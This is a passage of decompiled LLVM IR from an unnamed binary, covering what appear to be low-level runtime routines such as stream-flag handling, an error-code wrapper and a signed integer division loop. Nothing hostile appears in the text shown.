  store i32 %v0_18b34, i32* %r0.global-to-local, align 4
  %v2_18b3c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18b3c, i32* @r4, align 4
  ret i32 %v0_18b34

; uselistorder directives
  uselistorder i32 %v0_18b34, { 1, 0 }
  uselistorder i1 %v9_18afc, { 1, 0 }
  uselistorder i32 %v2_18afc, { 1, 0 }
  uselistorder i32 %v10_18af8, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v5_18aec, { 2, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 5, 1, 3, 2, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 0 }
  uselistorder i32 44, { 11, 12, 7, 32, 8, 9, 0, 10, 1, 16, 17, 18, 19, 20, 21, 13, 14, 15, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 2, 3, 4, 5, 6 }
  uselistorder i32 40, { 13, 3, 1, 12, 4, 5, 6, 7, 8, 2, 9, 10, 11, 0, 14, 15, 16, 17, 18, 19 }
  uselistorder i16 0, { 6, 0, 1, 7, 2, 3, 4, 5, 8, 9, 10, 11, 15, 14, 13, 12, 16, 17 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_18b34, { 2, 1, 0 }
  uselistorder label %bb14, { 4, 1, 2, 3, 0 }
}

define i32 @function_18b44(i32 %arg1) local_unnamed_addr {
dec_label_pc_18b44:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18b44 = load i32, i32* @r4, align 4
  store i32 %v3_18b44, i32* %stack_var_-8, align 4
  %v1_18b48 = add i32 %arg1, 8
  %v1_18b4c = inttoptr i32 %v1_18b48 to i32*
  %v2_18b4c = load i32, i32* %v1_18b4c, align 4
  %v3_18b4c = add i32 %arg1, 12
  %v4_18b4c = inttoptr i32 %v3_18b4c to i32*
  %v5_18b4c = load i32, i32* %v4_18b4c, align 4
  %v2_18b50 = sub i32 %v5_18b4c, %v2_18b4c
  store i32 %v2_18b50, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_18b58 = inttoptr i32 %arg1 to i16*
  %v4_18b58 = call i32 @function_18a28(i16* %v3_18b58, i32 %v2_18b4c, i32 %v2_18b50)
  %v0_18b5c = load i32, i32* @r4, align 4
  %v1_18b5c = add i32 %v0_18b5c, 8
  %v2_18b5c = inttoptr i32 %v1_18b5c to i32*
  %v3_18b5c = load i32, i32* %v2_18b5c, align 4
  store i32 %v3_18b5c, i32* %r2.global-to-local, align 4
  %v2_18b60 = add i32 %v3_18b5c, %v4_18b58
  %v2_18b64 = add i32 %v0_18b5c, 20
  %v3_18b64 = inttoptr i32 %v2_18b64 to i32*
  store i32 %v2_18b60, i32* %v3_18b64, align 4
  %v0_18b68 = load i32, i32* %r2.global-to-local, align 4
  %v1_18b68 = load i32, i32* @r4, align 4
  %v2_18b68 = add i32 %v1_18b68, 16
  %v3_18b68 = inttoptr i32 %v2_18b68 to i32*
  store i32 %v0_18b68, i32* %v3_18b68, align 4
  %v2_18b6c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18b6c, i32* @r4, align 4
  ret i32 %v4_18b58

; uselistorder directives
  uselistorder i32 %v4_18b58, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @function_18b74() local_unnamed_addr {
dec_label_pc_18b74:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18b74 = load i32, i32* @r4, align 4
  store i32 %v3_18b74, i32* %stack_var_-12, align 4
  %v0_18b78 = load i32, i32* @r0, align 4
  %v1_18b78 = inttoptr i32 %v0_18b78 to i16*
  %v2_18b78 = load i16, i16* %v1_18b78, align 2
  %v3_18b78 = zext i16 %v2_18b78 to i32
  store i32 %v3_18b78, i32* %r3.global-to-local, align 4
  %v0_18b7c = load i32, i32* @r1, align 4
  %v2_18b7c = and i32 %v0_18b7c, %v3_18b78
  %v4_18b7c = icmp eq i32 %v2_18b7c, 0
  store i32 %v0_18b78, i32* @r4, align 4
  br i1 %v4_18b7c, label %dec_label_pc_18b8c, label %dec_label_pc_18b9c

dec_label_pc_18b8c:                               ; preds = %dec_label_pc_18b74
  %v1_18b8c = and i32 %v3_18b78, 2176
  %v2_18b8c = icmp eq i32 %v1_18b8c, 0
  br i1 %v2_18b8c, label %dec_label_pc_18b94, label %dec_label_pc_18ba8

dec_label_pc_18b94:                               ; preds = %dec_label_pc_18b8c
  %v2_18b94 = or i32 %v0_18b7c, %v3_18b78
  store i32 %v2_18b94, i32* %r3.global-to-local, align 4
  %v1_18b98 = trunc i32 %v2_18b94 to i16
  store i16 %v1_18b98, i16* %v1_18b78, align 2
  %v0_18b9c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18b9c

dec_label_pc_18b9c:                               ; preds = %dec_label_pc_18b74, %dec_label_pc_18b94
  %v0_18b9c = phi i32 [ %v0_18b78, %dec_label_pc_18b74 ], [ %v0_18b9c.pre, %dec_label_pc_18b94 ]
  %v1_18b9c = inttoptr i32 %v0_18b9c to i16*
  %v2_18b9c = load i16, i16* %v1_18b9c, align 2
  %v3_18b9c = zext i16 %v2_18b9c to i32
  store i32 %v3_18b9c, i32* %r3.global-to-local, align 4
  %v1_18ba0 = and i32 %v3_18b9c, 16
  store i32 %v1_18ba0, i32* %r5.global-to-local, align 4
  %v2_18ba0 = icmp eq i32 %v1_18ba0, 0
  br i1 %v2_18ba0, label %dec_label_pc_18bc8, label %dec_label_pc_18ba8

dec_label_pc_18ba8:                               ; preds = %dec_label_pc_18b8c, %dec_label_pc_18b9c
  %v0_18ba8 = call i32 @function_1095c()
  store i32 %v0_18ba8, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_18bb0 = inttoptr i32 %v0_18ba8 to i32*
  store i32 9, i32* %v2_18bb0, align 4
  br label %dec_label_pc_18bb4

dec_label_pc_18bb4:                               ; preds = %dec_label_pc_18bd0, %dec_label_pc_18ba8
  %v0_18bb4 = load i32, i32* @r4, align 4
  %v1_18bb4 = inttoptr i32 %v0_18bb4 to i16*
  %v2_18bb4 = load i16, i16* %v1_18bb4, align 2
  %v3_18bb4 = zext i16 %v2_18bb4 to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_18bbc = or i32 %v3_18bb4, 8
  store i32 %v1_18bbc, i32* %r3.global-to-local, align 4
  %v1_18bc0 = trunc i32 %v1_18bbc to i16
  store i16 %v1_18bc0, i16* %v1_18bb4, align 2
  %v1_18c08.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18c00

dec_label_pc_18bc8:                               ; preds = %dec_label_pc_18b9c
  %v1_18bc8 = and i32 %v3_18b9c, 64
  %v2_18bc8 = icmp eq i32 %v1_18bc8, 0
  br i1 %v2_18bc8, label %dec_label_pc_18bf0, label %dec_label_pc_18bd0

dec_label_pc_18bd0:                               ; preds = %dec_label_pc_18bc8
  %v0_18bd0 = call i32 @function_10c14()
  store i32 %v0_18bd0, i32* %r0.global-to-local, align 4
  %v2_18bd4 = icmp eq i32 %v0_18bd0, 0
  br i1 %v2_18bd4, label %dec_label_pc_18bdc, label %dec_label_pc_18bb4

dec_label_pc_18bdc:                               ; preds = %dec_label_pc_18bd0
  %v0_18bdc = load i32, i32* @r4, align 4
  %v1_18bdc = inttoptr i32 %v0_18bdc to i16*
  %v2_18bdc = load i16, i16* %v1_18bdc, align 2
  %v3_18bdc = zext i16 %v2_18bdc to i32
  store i32 %v3_18bdc, i32* %r3.global-to-local, align 4
  %v1_18be0 = add i32 %v0_18bdc, 8
  %v2_18be0 = inttoptr i32 %v1_18be0 to i32*
  %v3_18be0 = load i32, i32* %v2_18be0, align 4
  %v1_18be4 = and i32 %v3_18bdc, 65471
  store i32 %v1_18be4, i32* %r3.global-to-local, align 4
  %v2_18be8 = add i32 %v0_18bdc, 28
  %v3_18be8 = inttoptr i32 %v2_18be8 to i32*
  store i32 %v3_18be0, i32* %v3_18be8, align 4
  %v0_18bec = load i32, i32* %r3.global-to-local, align 4
  %v1_18bec = trunc i32 %v0_18bec to i16
  %v2_18bec = load i32, i32* @r4, align 4
  %v3_18bec = inttoptr i32 %v2_18bec to i16*
  store i16 %v1_18bec, i16* %v3_18bec, align 2
  %v0_18bf0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18bf0

dec_label_pc_18bf0:                               ; preds = %dec_label_pc_18bc8, %dec_label_pc_18bdc
  %v2_18bf8 = phi i32 [ %v0_18b9c, %dec_label_pc_18bc8 ], [ %v0_18bf0.pre, %dec_label_pc_18bdc ]
  %v1_18bf0 = inttoptr i32 %v2_18bf8 to i16*
  %v2_18bf0 = load i16, i16* %v1_18bf0, align 2
  %v3_18bf0 = zext i16 %v2_18bf0 to i32
  %v1_18bf4 = or i32 %v3_18bf0, 1
  store i32 %v1_18bf4, i32* %r3.global-to-local, align 4
  %v1_18bf8 = trunc i32 %v1_18bf4 to i16
  store i16 %v1_18bf8, i16* %v1_18bf0, align 2
  %v0_18bfc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_18bfc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18c00

dec_label_pc_18c00:                               ; preds = %dec_label_pc_18bb4, %dec_label_pc_18bf0
  %v1_18c08 = phi i32 [ %v1_18c08.pre, %dec_label_pc_18bb4 ], [ %v0_18bfc, %dec_label_pc_18bf0 ]
  %v2_18c04 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18c04, i32* @r4, align 4
  ret i32 %v1_18c08

; uselistorder directives
  uselistorder i32 %v3_18b78, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 28, { 32, 1, 39, 31, 53, 10, 33, 34, 11, 35, 2, 36, 37, 12, 13, 14, 16, 15, 17, 3, 18, 40, 19, 38, 20, 21, 22, 23, 24, 25, 26, 4, 27, 28, 29, 30, 5, 41, 42, 43, 44, 45, 46, 47, 48, 0, 49, 6, 7, 50, 51, 8, 9, 52 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 ()* @function_10c14, { 7, 4, 6, 5, 3, 2, 1, 0 }
  uselistorder i32 64, { 3, 7, 2, 4, 5, 6, 0, 1, 8, 9 }
  uselistorder i32 9, { 21, 31, 32, 33, 27, 28, 22, 34, 1, 35, 40, 23, 24, 30, 29, 36, 37, 38, 39, 25, 26, 20, 19, 18, 17, 16, 13, 14, 15, 12, 11, 9, 10, 8, 7, 6, 5, 4, 3, 2, 0, 41 }
  uselistorder label %dec_label_pc_18c00, { 1, 0 }
  uselistorder label %dec_label_pc_18bf0, { 1, 0 }
  uselistorder label %dec_label_pc_18ba8, { 1, 0 }
  uselistorder label %dec_label_pc_18b9c, { 1, 0 }
}

define i32 @function_18c0c(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_18c0c:
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_18c18 = load i32, i32* %arg2, align 4
  %v3_18c18 = add i32 %tmp, 4
  %v4_18c18 = inttoptr i32 %v3_18c18 to i32*
  %v5_18c18 = load i32, i32* %v4_18c18, align 4
  %v1_18c1c = add i32 %arg1, 4
  %v2_18c1c = inttoptr i32 %v1_18c1c to i32*
  %v3_18c1c = load i32, i32* %v2_18c1c, align 4
  store i32 %tmp, i32* @r4, align 4
  %v4_18c24 = call i32 @function_18c48(i32 %v3_18c1c, i32 %tmp, i32 %v2_18c18, i32 %v5_18c18)
  %v1_18c28 = icmp slt i32* %arg2, null
  br i1 %v1_18c28, label %bb13, label %bb

bb:                                               ; preds = %dec_label_pc_18c0c
  %v3_18c305 = load i32, i32* @r4, align 4
  %v4_18c306 = inttoptr i32 %v3_18c305 to i32*
  store i32 %v4_18c24, i32* %v4_18c306, align 4
  %v6_18c307 = add i32 %v3_18c305, 4
  %v7_18c308 = inttoptr i32 %v6_18c307 to i32*
  store i32 %tmp, i32* %v7_18c308, align 4
  br label %bb13

bb13:                                             ; preds = %dec_label_pc_18c0c, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v4_18c24, %dec_label_pc_18c0c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder i32* null, { 2, 3, 0, 4, 1, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 14, 17, 18, 27, 28, 25, 26, 23, 24, 21, 22, 19, 20, 29, 5 }
  uselistorder label %bb13, { 1, 0 }
}

define i32 @function_18c48(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_18c48:
  %r4.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_18c88, label %dec_label_pc_18c74

dec_label_pc_18c74:                               ; preds = %dec_label_pc_18c48
  %v0_18c74 = call i32 @function_1095c()
  %v0_18c78 = load i32, i32* %r4.global-to-local, align 4
  %v1_18c78 = sub i32 0, %v0_18c78
  store i32 -1, i32* @r2, align 4
  %v2_18c80 = inttoptr i32 %v0_18c74 to i32*
  store i32 %v1_18c78, i32* %v2_18c80, align 4
  %v0_18c90.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_18c90

dec_label_pc_18c88:                               ; preds = %dec_label_pc_18c48
  store i32 %arg1, i32* @r2, align 4
  %v2_18c88 = icmp eq i32 %arg1, 0
  br i1 %v2_18c88, label %dec_label_pc_18c9c, label %dec_label_pc_18c90

dec_label_pc_18c90:                               ; preds = %dec_label_pc_18c88, %dec_label_pc_18c74
  %v0_18c90 = phi i32 [ %arg1, %dec_label_pc_18c88 ], [ %v0_18c90.pre, %dec_label_pc_18c74 ]
  br label %dec_label_pc_18ca0

dec_label_pc_18c9c:                               ; preds = %dec_label_pc_18c88
  br label %dec_label_pc_18ca0

dec_label_pc_18ca0:                               ; preds = %dec_label_pc_18c90, %dec_label_pc_18c9c
  %v1_18ca8 = phi i32 [ %v0_18c90, %dec_label_pc_18c90 ], [ %tmp8, %dec_label_pc_18c9c ]
  ret i32 %v1_18ca8

; uselistorder directives
  uselistorder i32 ()* @function_1095c, { 53, 64, 52, 51, 71, 70, 63, 69, 62, 61, 50, 60, 59, 49, 74, 73, 68, 67, 66, 65, 5, 48, 20, 11, 72, 10, 25, 9, 19, 18, 17, 40, 39, 58, 57, 56, 16, 13, 47, 24, 34, 15, 14, 12, 28, 31, 42, 30, 46, 35, 45, 55, 8, 2, 4, 41, 44, 6, 54, 0, 22, 3, 26, 43, 27, 32, 7, 1, 21, 38, 37, 36, 33, 29, 23 }
  uselistorder i32 %arg1, { 1, 3, 4, 0, 2 }
  uselistorder label %dec_label_pc_18ca0, { 1, 0 }
}

define i32 @function_18cac() local_unnamed_addr {
dec_label_pc_18cac:
  %v0_18cac = load i32, i32* @r1, align 4
  %v1_18cac = icmp slt i32 %v0_18cac, 0
  %v2_18cac = icmp eq i32 %v0_18cac, 0
  %v0_18cb0 = load i32, i32* @r0, align 4
  %v2_18cb0 = xor i32 %v0_18cb0, %v0_18cac
  br i1 %v2_18cac, label %dec_label_pc_18dc4, label %dec_label_pc_18cb8

dec_label_pc_18cb8:                               ; preds = %dec_label_pc_18cac
  br i1 %v1_18cac, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_18cb8
  %v2_18cb8 = sub i32 0, %v0_18cac
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_18cb8, %bb
  %v1_18d84 = phi i32 [ %v2_18cb8, %bb ], [ %v0_18cac, %dec_label_pc_18cb8 ]
  %v1_18cbc = add i32 %v1_18d84, -1
  %v7_18cbc = icmp eq i32 %v1_18d84, 1
  br i1 %v7_18cbc, label %dec_label_pc_18d64, label %dec_label_pc_18cc4

dec_label_pc_18cc4:                               ; preds = %thread-pre-split
  %v1_18cc4 = icmp slt i32 %v0_18cb0, 0
  br i1 %v1_18cc4, label %bb84, label %bb85

bb84:                                             ; preds = %dec_label_pc_18cc4
  %v2_18cc8 = sub i32 0, %v0_18cb0
  br label %bb85

bb85:                                             ; preds = %dec_label_pc_18cc4, %bb84
  %v0_18db8 = phi i32 [ %v0_18cb0, %dec_label_pc_18cc4 ], [ %v2_18cc8, %bb84 ]
  %v3_18ccc = icmp uge i32 %v0_18db8, %v1_18d84
  %v9_18ccc = icmp eq i32 %v0_18db8, %v1_18d84
  %v2_18cd0 = xor i1 %v3_18ccc, true
  %v3_18cd0 = or i1 %v9_18ccc, %v2_18cd0
  br i1 %v3_18cd0, label %dec_label_pc_18d70, label %dec_label_pc_18cd4

dec_label_pc_18cd4:                               ; preds = %bb85
  %v2_18cd4 = and i32 %v1_18cbc, %v1_18d84
  %v4_18cd4 = icmp eq i32 %v2_18cd4, 0
  br i1 %v4_18cd4, label %dec_label_pc_18d80, label %dec_label_pc_18cdc

dec_label_pc_18cdc:                               ; preds = %dec_label_pc_18cd4
  %v3_18cdc = icmp ult i32 %v1_18d84, 536870912
  br i1 %v3_18cdc, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_18cdc
  %v4_18ce0 = mul i32 %v1_18d84, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_18cdc, %.thread
  %v0_18d00.pr40.ph = phi i32 [ %v4_18ce0, %.thread ], [ %v1_18d84, %dec_label_pc_18cdc ]
  %storemerge142 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_18cdc ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb88
  %v0_18d00.pr40 = phi i32 [ %v4_18cf4, %bb88 ], [ %v0_18d00.pr40.ph, %.preheader.preheader ]
  %v1_18cf8 = phi i32 [ %v4_18cf8, %bb88 ], [ %storemerge142, %.preheader.preheader ]
  %v2_18cec = icmp ugt i32 %v0_18d00.pr40, 268435455
  br i1 %v2_18cec, label %.thread3, label %bb86

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_18d00thread-pre-split.loopexit

bb86:                                             ; preds = %.preheader
  %v4_18cf0 = icmp ult i32 %v0_18d00.pr40, %v0_18db8
  br i1 %v4_18cf0, label %bb87, label %dec_label_pc_18d00thread-pre-split.loopexit.loopexit

bb87:                                             ; preds = %bb86
  %v2_18cf4 = and i32 %v0_18d00.pr40, 268435456
  %v3_18cf4 = icmp eq i32 %v2_18cf4, 0
  %v4_18cf4 = mul i32 %v0_18d00.pr40, 16
  br i1 %v3_18cf4, label %bb88, label %dec_label_pc_18d00.loopexit

bb88:                                             ; preds = %bb87
  %v2_18cf8 = and i32 %v1_18cf8, 268435456
  %v3_18cf8 = icmp eq i32 %v2_18cf8, 0
  %v4_18cf8 = mul i32 %v1_18cf8, 16
  br i1 %v3_18cf8, label %.preheader, label %dec_label_pc_18d00thread-pre-split.loopexit.loopexit

dec_label_pc_18d00thread-pre-split.loopexit.loopexit: ; preds = %bb88, %bb86
  %v1_18d0c52.ph = phi i32 [ %v1_18cf8, %bb86 ], [ %v4_18cf8, %bb88 ]
  %v0_18d00.pr42.ph = phi i32 [ %v0_18d00.pr40, %bb86 ], [ %v4_18cf4, %bb88 ]
  br label %dec_label_pc_18d00thread-pre-split.loopexit

dec_label_pc_18d00thread-pre-split.loopexit:      ; preds = %dec_label_pc_18d00thread-pre-split.loopexit.loopexit, %.thread3
  %v1_18d0c52 = phi i32 [ %v1_18cf8, %.thread3 ], [ %v1_18d0c52.ph, %dec_label_pc_18d00thread-pre-split.loopexit.loopexit ]
  %v0_18d00.pr42 = phi i32 [ %v0_18d00.pr40, %.thread3 ], [ %v0_18d00.pr42.ph, %dec_label_pc_18d00thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_18d00thread-pre-split

dec_label_pc_18d00thread-pre-split:               ; preds = %dec_label_pc_18d00thread-pre-split.loopexit, %bb90
  %v1_18d0c50 = phi i32 [ %v1_18d0c52, %dec_label_pc_18d00thread-pre-split.loopexit ], [ %v3_18d0c, %bb90 ]
  %v2_18d0448 = phi i32 [ %v0_18db8, %dec_label_pc_18d00thread-pre-split.loopexit ], [ %v2_18d04, %bb90 ]
  %v0_18d00.pr = phi i32 [ %v0_18d00.pr42, %dec_label_pc_18d00thread-pre-split.loopexit ], [ %v3_18d08, %bb90 ]
  br label %dec_label_pc_18d00

dec_label_pc_18d00.loopexit:                      ; preds = %bb87
  br label %dec_label_pc_18d00

dec_label_pc_18d00:                               ; preds = %dec_label_pc_18d00.loopexit, %dec_label_pc_18d00thread-pre-split
  %v1_18d0c = phi i32 [ %v1_18d0c50, %dec_label_pc_18d00thread-pre-split ], [ %v1_18cf8, %dec_label_pc_18d00.loopexit ]
  %v2_18d04 = phi i32 [ %v2_18d0448, %dec_label_pc_18d00thread-pre-split ], [ %v0_18db8, %dec_label_pc_18d00.loopexit ]
  %v1_18d08 = phi i32 [ %v0_18d00.pr, %dec_label_pc_18d00thread-pre-split ], [ %v4_18cf4, %dec_label_pc_18d00.loopexit ]
  %v2_18d00 = icmp slt i32 %v1_18d08, 0
  br i1 %v2_18d00, label %dec_label_pc_18d14, label %bb89

bb89:                                             ; preds = %dec_label_pc_18d00
  %v4_18d04 = icmp ult i32 %v1_18d08, %v2_18d04
  br i1 %v4_18d04, label %bb90, label %dec_label_pc_18d14

bb90:                                             ; preds = %bb89
  %v3_18d08 = mul i32 %v1_18d08, 2
  %v2_18d0c = icmp slt i32 %v1_18d0c, 0
  %v3_18d0c = mul i32 %v1_18d0c, 2
  br i1 %v2_18d0c, label %dec_label_pc_18d14, label %dec_label_pc_18d00thread-pre-split

dec_label_pc_18d14:                               ; preds = %bb89, %dec_label_pc_18d00, %bb90
  %v2_18d2063 = phi i32 [ %v3_18d0c, %bb90 ], [ %v1_18d0c, %bb89 ], [ %v1_18d0c, %dec_label_pc_18d00 ]
  %v1_18d1855 = phi i32 [ %v3_18d08, %bb90 ], [ %v1_18d08, %bb89 ], [ %v1_18d08, %dec_label_pc_18d00 ]
  br label %dec_label_pc_18d18

dec_label_pc_18d18:                               ; preds = %.thread13, %dec_label_pc_18d14
  %v1_18d4c = phi i32 [ %v4_18d4c, %.thread13 ], [ %v2_18d2063, %dec_label_pc_18d14 ]
  %v1_18d20 = phi i32 [ %v1_18d5c, %.thread13 ], [ 0, %dec_label_pc_18d14 ]
  %v1_18d50 = phi i32 [ %v4_18d50, %.thread13 ], [ %v1_18d1855, %dec_label_pc_18d14 ]
  %v1_18d1c = phi i32 [ %v0_18d48, %.thread13 ], [ %v0_18db8, %dec_label_pc_18d14 ]
  %v3_18d18 = icmp ult i32 %v1_18d1c, %v1_18d50
  br i1 %v3_18d18, label %.thread8, label %bb91

bb91:                                             ; preds = %dec_label_pc_18d18
  %v3_18d1c = sub i32 %v1_18d1c, %v1_18d50
  %v3_18d20 = or i32 %v1_18d20, %v1_18d4c
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_18d18, %bb91
  %v1_18d28 = phi i32 [ %v1_18d1c, %dec_label_pc_18d18 ], [ %v3_18d1c, %bb91 ]
  %v1_18d2c = phi i32 [ %v1_18d20, %dec_label_pc_18d18 ], [ %v3_18d20, %bb91 ]
  %v4_18d24 = udiv i32 %v1_18d50, 2
  %v6_18d24 = icmp ult i32 %v1_18d28, %v4_18d24
  br i1 %v6_18d24, label %.thread9, label %bb92

bb92:                                             ; preds = %.thread8
  %v3_18d28 = urem i32 %v1_18d50, 2
  %v4_18d28 = icmp eq i32 %v3_18d28, 0
  %v6_18d28 = sub i32 %v1_18d28, %v4_18d24
  br i1 %v4_18d28, label %.thread9, label %bb93

bb93:                                             ; preds = %bb92
  %v5_18d2c = udiv i32 %v1_18d4c, 2
  %v6_18d2c = or i32 %v1_18d2c, %v5_18d2c
  br label %.thread9

.thread9:                                         ; preds = %bb92, %.thread8, %bb93
  %v1_18d34 = phi i32 [ %v6_18d28, %bb92 ], [ %v1_18d28, %.thread8 ], [ %v6_18d28, %bb93 ]
  %v1_18d38 = phi i32 [ %v1_18d2c, %bb92 ], [ %v1_18d2c, %.thread8 ], [ %v6_18d2c, %bb93 ]
  %v4_18d30 = udiv i32 %v1_18d50, 4
  %v6_18d30 = icmp ult i32 %v1_18d34, %v4_18d30
  br i1 %v6_18d30, label %.thread10, label %bb94

bb94:                                             ; preds = %.thread9
  %v3_18d34 = and i32 %v1_18d50, 2
  %v4_18d34 = icmp eq i32 %v3_18d34, 0
  %v6_18d34 = sub i32 %v1_18d34, %v4_18d30
  br i1 %v4_18d34, label %.thread10, label %bb95

bb95:                                             ; preds = %bb94
  %v5_18d38 = udiv i32 %v1_18d4c, 4
  %v6_18d38 = or i32 %v1_18d38, %v5_18d38
  br label %.thread10

.thread10:                                        ; preds = %bb94, %.thread9, %bb95
  %v1_18d40 = phi i32 [ %v6_18d34, %bb94 ], [ %v1_18d34, %.thread9 ], [ %v6_18d34, %bb95 ]
  %v1_18d44 = phi i32 [ %v1_18d38, %bb94 ], [ %v1_18d38, %.thread9 ], [ %v6_18d38, %bb95 ]
  %v4_18d3c = udiv i32 %v1_18d50, 8
  %v6_18d3c = icmp ult i32 %v1_18d40, %v4_18d3c
  br i1 %v6_18d3c, label %thread-pre-split12, label %bb96

bb96:                                             ; preds = %.thread10
  %v3_18d40 = and i32 %v1_18d50, 4
  %v4_18d40 = icmp eq i32 %v3_18d40, 0
  %v6_18d40 = sub i32 %v1_18d40, %v4_18d3c
  br i1 %v4_18d40, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %bb96
  %v5_18d44 = udiv i32 %v1_18d4c, 8
  %v6_18d44 = or i32 %v1_18d44, %v5_18d44
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb97, %.thread10, %bb96
  %v1_18d5c = phi i32 [ %v1_18d44, %bb96 ], [ %v1_18d44, %.thread10 ], [ %v6_18d44, %bb97 ]
  %v0_18d48 = phi i32 [ %v6_18d40, %bb96 ], [ %v1_18d40, %.thread10 ], [ %v6_18d40, %bb97 ]
  %v2_18d48 = icmp eq i32 %v0_18d48, 0
  br i1 %v2_18d48, label %dec_label_pc_18d58, label %bb98

bb98:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_18d4c, 16
  br i1 %tmp, label %dec_label_pc_18d58, label %.thread13

.thread13:                                        ; preds = %bb98
  %v4_18d4c = udiv i32 %v1_18d4c, 16
  %v4_18d50 = udiv i32 %v1_18d50, 16
  br label %dec_label_pc_18d18

dec_label_pc_18d58:                               ; preds = %thread-pre-split12, %bb98
  %v1_18d58 = icmp slt i32 %v2_18cb0, 0
  br i1 %v1_18d58, label %bb99, label %.thread16

bb99:                                             ; preds = %dec_label_pc_18d58
  %v2_18d5c = sub i32 0, %v1_18d5c
  br label %.thread16

.thread16:                                        ; preds = %bb103, %bb102, %bb100, %dec_label_pc_18d64, %dec_label_pc_18d58, %bb99
  %v1_18d60 = phi i32 [ %v1_18d5c, %dec_label_pc_18d58 ], [ %v2_18d5c, %bb99 ], [ %v2_18d68, %bb100 ], [ undef, %dec_label_pc_18d64 ], [ %v1_18d7c80, %bb102 ], [ %v2_18d78, %bb103 ]
  ret i32 %v1_18d60

dec_label_pc_18d64:                               ; preds = %thread-pre-split
  br i1 %v1_18cac, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_18d64
  %v2_18d68 = sub i32 0, %v0_18cb0
  br label %.thread16

dec_label_pc_18d70:                               ; preds = %bb85
  br i1 %v3_18ccc, label %bb102, label %bb101

bb101:                                            ; preds = %dec_label_pc_18d70
  br label %bb102

bb102:                                            ; preds = %dec_label_pc_18d70, %bb101
  %v1_18d7c80 = phi i32 [ %v0_18cb0, %dec_label_pc_18d70 ], [ 0, %bb101 ]
  br i1 %v9_18ccc, label %bb103, label %.thread16

bb103:                                            ; preds = %bb102
  %v4_18d74 = ashr i32 %v2_18cb0, 31
  %v2_18d78 = or i32 %v4_18d74, 1
  br label %.thread16

dec_label_pc_18d80:                               ; preds = %dec_label_pc_18cd4
  %v2_18d80 = icmp ugt i32 %v1_18d84, 65535
  br i1 %v2_18d80, label %bb104, label %.thread19

bb104:                                            ; preds = %dec_label_pc_18d80
  %v2_18d84 = and i32 %v1_18d84, 32768
  %v3_18d84 = icmp eq i32 %v2_18d84, 0
  %v4_18d84 = udiv i32 %v1_18d84, 65536
  br i1 %v3_18d84, label %.thread19, label %bb105

.thread19:                                        ; preds = %bb104, %dec_label_pc_18d80
  %v0_18d9070 = phi i32 [ %v1_18d84, %dec_label_pc_18d80 ], [ %v4_18d84, %bb104 ]
  br label %bb105

bb105:                                            ; preds = %bb104, %.thread19
  %v1_18d94 = phi i32 [ %v0_18d9070, %.thread19 ], [ %v4_18d84, %bb104 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb104 ]
  %v2_18d90 = icmp ugt i32 %v1_18d94, 255
  br i1 %v2_18d90, label %bb106, label %.thread20

bb106:                                            ; preds = %bb105
  %v2_18d94 = and i32 %v1_18d94, 128
  %v3_18d94 = icmp eq i32 %v2_18d94, 0
  %v4_18d94 = udiv i32 %v1_18d94, 256
  br i1 %v3_18d94, label %.thread20, label %bb107

bb107:                                            ; preds = %bb106
  %v2_18d98 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb106, %bb105, %bb107
